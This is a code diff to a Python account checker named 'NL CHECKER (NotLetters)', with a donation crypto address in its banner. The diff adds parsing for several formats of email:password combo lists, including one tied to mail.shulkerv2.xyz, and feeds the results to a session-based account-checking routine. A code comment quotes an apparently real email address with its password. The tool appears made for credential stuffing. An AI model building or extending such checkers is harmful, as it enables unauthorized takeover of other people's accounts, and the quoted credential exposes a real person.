@@ -86,17 +86,44 @@ class NL_Checker:
 
     def extract_emails(self, filename):
         # Flexible regex for email:password
-        pattern = r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}):([^\s|]+)'
+        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}'
         self.found_accounts = []
+        format_detected = None
+        
         with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
             for line in f:
                 line = line.strip()
                 if not line: continue
-                # We prioritize lines containing ':' and '@'
-                match = re.search(pattern, line)
+
+                # 1. SV2 Format Check
+                if "login at mail.shulkerv2.xyz" in line:
+                    # Pattern example: Nathchamp11@gmail.com:Alishachamp0 | radian022108@arrangementmail.ru:password - login at mail.shulkerv2.xyz
+                    sv2_match = re.search(r'\|\s*(' + email_pattern + r'):([^\s|]+)\s*-\s*login at mail\.shulkerv2\.xyz', line)
+                    if sv2_match:
+                        self.found_accounts.append((line, sv2_match.group(1), sv2_match.group(2)))
+                        format_detected = "SV2"
+                        continue
+
+                # 2. UKN Format Check (Generic 2 emails, use 2nd one)
+                emails = re.findall(email_pattern, line)
+                if len(emails) >= 2:
+                    email2 = emails[1]
+                    # Find password following the 2nd email
+                    # We look for email2:password
+                    ukn_pattern = re.escape(email2) + r':([^\s|]+)'
+                    ukn_match = re.search(ukn_pattern, line)
+                    if ukn_match:
+                        self.found_accounts.append((line, email2, ukn_match.group(1)))
+                        if not format_detected:
+                            format_detected = "UKN"
+                        continue
+
+                # 3. Default Format (Current logic - fallback)
+                match = re.search(r'(' + email_pattern + r'):([^\s|]+)', line)
                 if match:
                     self.found_accounts.append((line, match.group(1), match.group(2)))
-        return len(self.found_accounts)
+        
+        return len(self.found_accounts), format_detected
 
     def check_account(self, full_line, email, password):
         session = requests.Session()
@@ -229,11 +256,18 @@ class NL_Checker:
         if not selected_file:
             return
 
-        count = self.extract_emails(selected_file)
+        count, format_type = self.extract_emails(selected_file)
         os.system('cls' if os.name == 'nt' else 'clear')
+        
+        format_tag = ""
+        if format_type == "SV2":
+            format_tag = " (SV2 format detected)"
+        elif format_type == "UKN":
+            format_tag = " (UKN format detected)"
+
         print(f"{ColorCyan}{ColorBold}NL CHECKER (NotLetters) - BY Chuborn{ColorReset}")
         print(f"{ColorGray}ltc1qnt9an3zncufvs2vcueuy5nh8q04s9l2q78svu7{ColorReset}\n")
-        print(f"found {count} accounts in {selected_file}\n")
+        print(f"found {count} accounts in {selected_file}{format_tag}\n")
         
         if count == 0:
             return
